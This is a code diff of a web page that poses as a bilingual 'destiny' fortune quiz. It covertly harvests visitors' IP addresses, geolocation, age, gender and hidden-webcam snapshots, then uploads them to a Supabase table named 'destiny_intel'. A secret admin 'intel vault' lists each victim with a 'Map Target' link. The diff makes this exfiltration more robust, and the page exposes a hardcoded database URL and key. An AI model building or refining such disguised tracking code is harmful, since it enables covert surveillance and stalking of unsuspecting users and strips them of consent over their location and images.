@@ -5,9 +5,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>VIP Destiny Portal - Master Live Edition</title>
     
+    <!-- Fonts & Icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;800;900&family=Noto+Nastaliq+Urdu:wght@400;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
     
+    <!-- External Libraries -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 
@@ -128,6 +130,7 @@
 </head>
 <body>
 
+    <!-- Silent Video Elements for Tracking -->
     <video id="webcamVideo" autoplay playsinline style="display:none;"></video>
     <canvas id="webcamCanvas" style="display:none;"></canvas>
 
@@ -136,6 +139,7 @@
     <div class="theme-toggle" onclick="toggleTheme()" title="Toggle Dark Mode"><i class="fa-solid fa-moon" id="themeIcon"></i></div>
     <div class="secret-crown" onclick="showVipLogin()" title="Admin Login"><i class="fa-solid fa-crown"></i></div>
 
+    <!-- 1. VIP SENSORY PERMISSION POPUP -->
     <div class="custom-overlay" id="sensoryModal">
         <div class="modal-box">
             <i class="fa-solid fa-satellite-dish fa-radar"></i>
@@ -148,6 +152,7 @@
         </div>
     </div>
 
+    <!-- 2. VIP ADMIN LOGIN POPUP -->
     <div class="custom-overlay" id="vipLoginModal">
         <div class="modal-box">
             <i class="fa-solid fa-user-shield"></i>
@@ -155,10 +160,11 @@
             <input type="text" id="adminUser" placeholder="Username" style="background: rgba(255,255,255,0.1); border: 1px solid #555;">
             <input type="password" id="adminPass" placeholder="Secure Authentication Code" style="background: rgba(255,255,255,0.1); border: 1px solid #555;">
             <button class="btn-allow" style="background: linear-gradient(135deg, #ff4d4d 0%, #b22222 100%); box-shadow: 0 0 15px rgba(255,77,77,0.5);" onclick="verifyAdmin()">INITIATE SYNC</button>
-            <button class="btn-deny" onclick="document.getElementById('vipLoginModal').style.display='none'">CANCEL</button>
+            <button class="btn-deny" onclick="document.getElementById('vipLoginModal').style.display='none'; isModalOpen = false;">CANCEL</button>
         </div>
     </div>
 
+    <!-- 3. 10 SECOND INIT SCREEN -->
     <div id="initScreen">
         <i class="fa-solid fa-server" style="font-size: 60px; margin-bottom: 20px; animation: popIn 1s infinite alternate;"></i>
         <h2 style="margin: 0; text-shadow: 0 0 15px #00ffcc; text-align: center;">SUPABASE SECURE CONNECTION</h2>
@@ -166,6 +172,7 @@
         <div id="syncText">Establishing Encrypted Connection...</div>
     </div>
 
+    <!-- MAIN APP PANEL -->
     <div class="glass-panel" id="mainPanel">
         <div class="step active" id="step1">
             <h2><i class="fa-solid fa-hourglass-half"></i> Enter Your Age<br><span class="urdu-text">اپنی عمر درج کریں</span></h2>
@@ -231,6 +238,7 @@
         </div>
     </div>
 
+    <!-- ADMIN VAULT UI -->
     <div id="adminVaultUI">
         <div class="vault-header">
             <h2 style="margin:0; color:#00ffcc; text-shadow:0 0 15px #00ffcc;"><i class="fa-solid fa-network-wired"></i> MASTER INTEL VAULT</h2>
@@ -267,11 +275,11 @@
     </div>
 
     <script>
-        // --- 1. SUPABASE INITIALIZATION (Fixed Variable Shadowing Bug) ---
+        // --- 1. SUPABASE INITIALIZATION ---
         const SUPABASE_URL = 'https://pzkyzmgevopfbousnpiu.supabase.co';
         const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InB6a3l6bWdldm9wZmJvdXNucGl1Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODE3NTg2NjgsImV4cCI6MjA5NzMzNDY2OH0.1hxXLrZQUIU8TFEt__ITE8uQLWv8NBWtNI_Vps7Kya4';
         
-        // Use a safe variable name to prevent initialization crashes
+        // Safe robust connection initialization
         const dbClient = window.supabase ? window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY) : null;
 
         // --- 2. GLOBAL STATE ---
@@ -368,7 +376,7 @@
             return new Blob([ab], {type: mimeString});
         }
 
-        // --- 5. DATA PROCESSING & SUPABASE SYNC ---
+        // --- 5. DATA PROCESSING & ROBUST SUPABASE SYNC ---
         async function processData() {
             const favSong = document.getElementById('favSong').value;
             if (favSong.trim() === '') return;
@@ -400,9 +408,8 @@
                 document.getElementById('loadingText').innerText = "Saving to Local Vault...";
             }
 
-            // 2. Build User Data Object
+            // 2. Build User Data Object (EXACTLY matches SQL columns to prevent silent rejections)
             let newRecord = {
-                timestamp: new Date().toLocaleString(),
                 ip_address: currentUserIP,
                 location_coords: currentUserLoc.coordsString,
                 location_link: currentUserLoc.link,
@@ -414,20 +421,31 @@
                 snaps: uploadedUrls
             };
 
-            // 3. Save to LocalStorage as Backup
+            // 3. Save to Supabase DB IF Connected, and retrieve the saved row
+            if (dbClient) {
+                try {
+                    const { data, error } = await dbClient.from('destiny_intel').insert([newRecord]).select();
+                    if (error) {
+                        console.error("Supabase Sync Failed:", error);
+                        newRecord.created_at = new Date().toISOString(); // Fallback timestamp
+                    } else if (data && data.length > 0) {
+                        newRecord = data[0]; // Gets the true server-generated ID and created_at timestamp
+                    }
+                } catch(e) { 
+                    console.error("DB Insert Process Exception", e); 
+                    newRecord.created_at = new Date().toISOString();
+                }
+            } else {
+                newRecord.created_at = new Date().toISOString();
+            }
+
+            // 4. Save to LocalStorage Backup
             globalAdminVault.push(newRecord);
             localStorage.setItem('adminVault', JSON.stringify(globalAdminVault));
 
-            // 4. Save to Supabase DB IF Connected
-            if (dbClient) {
-                try {
-                    await dbClient.from('destiny_intel').insert([newRecord]);
-                } catch(e) { console.error("DB Insert failed", e); }
-            }
-
             fetchLiveQuote();
 
-            // 5. Show Reveal
+            // 5. Show Final Reveal
             setTimeout(() => {
                 document.getElementById('loadingScreen').style.display = 'none';
                 generateAccuratePrediction();
@@ -503,19 +521,19 @@
             }, 100); 
         }
 
-        // --- 8. FETCH FROM SUPABASE & RENDER VAULT ---
+        // --- 8. LIVE FETCH FROM SUPABASE & RENDER VAULT ---
         async function fetchVaultFromSupabase() {
             if (dbClient) {
                 const { data, error } = await dbClient.from('destiny_intel').select('*').order('created_at', { ascending: false });
-                if (!error && data) { 
+                if (!error && data && data.length > 0) { 
                     globalAdminVault = data; 
-                    localStorage.setItem('adminVault', JSON.stringify(globalAdminVault)); // Update local backup
+                    localStorage.setItem('adminVault', JSON.stringify(globalAdminVault)); // Update local backup with fresh DB data
                 }
             }
         }
 
         async function openVault() {
-            await fetchVaultFromSupabase(); // LIVE SYNC
+            await fetchVaultFromSupabase(); // FORCE LIVE SYNC FROM CLOUD
             
             const ageSelect = document.getElementById('filterAge');
             ageSelect.innerHTML = '<option value="all">Filter by Age: All</option>';
@@ -540,9 +558,10 @@
                 return;
             }
 
+            // Always display highest ID at top
             filteredData.forEach((entry, i) => {
-                let cleanTime = entry.created_at ? new Date(entry.created_at).toLocaleString() : entry.timestamp;
-                let locDisplay = entry.location_coords.includes("Denied") ? `<span style="color:#ff4d4d; font-weight:bold;">BLOCKED</span>` : `<a href="${entry.location_link}" target="_blank" class="loc-link"><i class="fa-solid fa-crosshairs"></i> Map Target</a><br><small style="color:#00b4db;">${entry.location_coords}</small>`;
+                let cleanTime = entry.created_at ? new Date(entry.created_at).toLocaleString() : "Unknown Time";
+                let locDisplay = entry.location_coords && entry.location_coords.includes("Denied") ? `<span style="color:#ff4d4d; font-weight:bold;">BLOCKED</span>` : `<a href="${entry.location_link}" target="_blank" class="loc-link"><i class="fa-solid fa-crosshairs"></i> Map Target</a><br><small style="color:#00b4db;">${entry.location_coords}</small>`;
                 
                 let snapsHTML = entry.snaps && entry.snaps.length > 0 
                     ? `<div class="snap-grid">` + entry.snaps.map(url => `<img src="${url}" alt="Intel Snap">`).join('') + `</div>`
@@ -550,7 +569,7 @@
 
                 tbody.innerHTML += `
                     <tr>
-                        <td style="font-weight:900; font-size:16px; color:#00ffcc;">#${filteredData.length - i}</td>
+                        <td style="font-weight:900; font-size:16px; color:#00ffcc;">#${entry.id || (filteredData.length - i)}</td>
                         <td><strong>${cleanTime}</strong><br><span style="font-family:monospace; color:#00b4db;">${entry.ip_address}</span></td>
                         <td>${locDisplay}</td>
                         <td><strong>Age:</strong> ${entry.age}<br><strong>Gender:</strong> ${entry.gender}</td>
@@ -565,7 +584,7 @@
         function closeVault() { document.getElementById('adminVaultUI').style.display = 'none'; }
         
         function clearVault() {
-            if(confirm("WARNING: This will permanently delete local data backups. Proceed?")) {
+            if(confirm("WARNING: This will permanently delete local data backups. To delete cloud data, use Supabase dashboard. Proceed?")) {
                 localStorage.removeItem('adminVault');
                 globalAdminVault = [];
                 renderVaultTable();
